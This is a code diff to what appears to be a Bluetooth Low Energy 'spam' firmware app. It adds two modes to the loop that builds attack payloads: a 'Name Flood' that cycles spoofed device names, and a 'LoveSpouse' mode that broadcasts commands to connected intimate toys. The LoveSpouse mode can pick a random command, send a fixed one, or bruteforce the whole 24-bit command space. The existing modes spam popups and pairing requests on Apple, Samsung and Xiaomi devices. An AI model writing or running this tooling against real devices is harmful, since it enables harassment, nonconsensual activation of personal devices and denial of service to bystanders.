@@ -1,9 +1,12 @@
 #include "../ble_spam_app.h"
 #include "../ble_spam_hal.h"
+#include "../ble_spam_lovespouse.h"
+#include "../ble_spam_nameflood.h"
 #include "../ble_spam_payloads.h"
 #include "../views/ble_spam_view.h"
 
 #include <esp_log.h>
+#include <stdio.h>
 #include <string.h>
 
 #define TAG BLE_SPAM_LOG_TAG
@@ -17,6 +20,8 @@ static const char* attack_short_names[] = {
     [BleSpamAttackSamsungBuds] = "Samsung Buds",
     [BleSpamAttackSamsungWatch] = "Samsung Watch",
     [BleSpamAttackXiaomi] = "Xiaomi",
+    [BleSpamAttackNameflood] = "Name Flood",
+    [BleSpamAttackLovespouse] = "LoveSpouse",
     [BleSpamAttackPairSpam] = "Pair Spam",
     [BleSpamAttackPairSpamRickroll] = "Pair Spam Rickroll",
     [BleSpamAttackPairSpamCustom] = "Pair Spam Custom",
@@ -30,6 +35,7 @@ static FuriThread* s_spam_thread = NULL;
 static uint8_t build_next_payload(BleSpamApp* app, uint8_t* buf) {
     uint8_t len = 0;
     const char* name = "";
+    char generated_name[32];
 
     switch(app->attack_type) {
     case BleSpamAttackAppleDevice: {
@@ -92,6 +98,41 @@ static uint8_t build_next_payload(BleSpamApp* app, uint8_t* buf) {
         name = "Xiaomi Device";
         len = ble_spam_build_xiaomi(buf);
         break;
+    case BleSpamAttackNameflood: {
+        size_t count = ble_spam_nameflood_name_count();
+        uint16_t idx = app->current_index % count;
+        name = ble_spam_nameflood_name_at(idx);
+        len = ble_spam_build_nameflood(buf, name);
+        app->current_index = idx + 1;
+        break;
+    }
+    case BleSpamAttackLovespouse: {
+        uint32_t mode_value = app->lovespouse_value & 0xFFFFFF;
+        if(app->lovespouse_selection == BleSpamLovespouseRandom) {
+            const size_t count = ble_spam_lovespouse_mode_count();
+            const BleSpamLovespouseMode* mode =
+                ble_spam_lovespouse_mode_at(furi_hal_random_get() % count);
+            mode_value = mode->value;
+            name = mode->name;
+        } else {
+            const BleSpamLovespouseMode* mode = ble_spam_lovespouse_find_mode(mode_value);
+            if(mode) {
+                name = mode->name;
+            } else {
+                snprintf(
+                    generated_name,
+                    sizeof(generated_name),
+                    "Mode %06lX",
+                    (unsigned long)mode_value);
+                name = generated_name;
+            }
+        }
+        len = ble_spam_build_lovespouse(buf, mode_value);
+        if(app->lovespouse_selection == BleSpamLovespouseBruteforce) {
+            app->lovespouse_value = (mode_value + 1) & 0xFFFFFF;
+        }
+        break;
+    }
     case BleSpamAttackPairSpam: {
         uint16_t idx = app->current_index % PAIR_SPAM_DEVICE_COUNT;
         name = pair_spam_device_names[idx];
@@ -160,6 +201,10 @@ void ble_spam_scene_running_on_enter(void* context) {
     app->delay_ms = 100;
     app->current_index = 0;
     app->current_device[0] = '\0';
+
+    if(app->attack_type == BleSpamAttackNameflood) {
+        ble_spam_nameflood_reload();
+    }
 
     if(!ble_spam_hal_start()) {
         ESP_LOGE(TAG, "BLE HAL init failed");
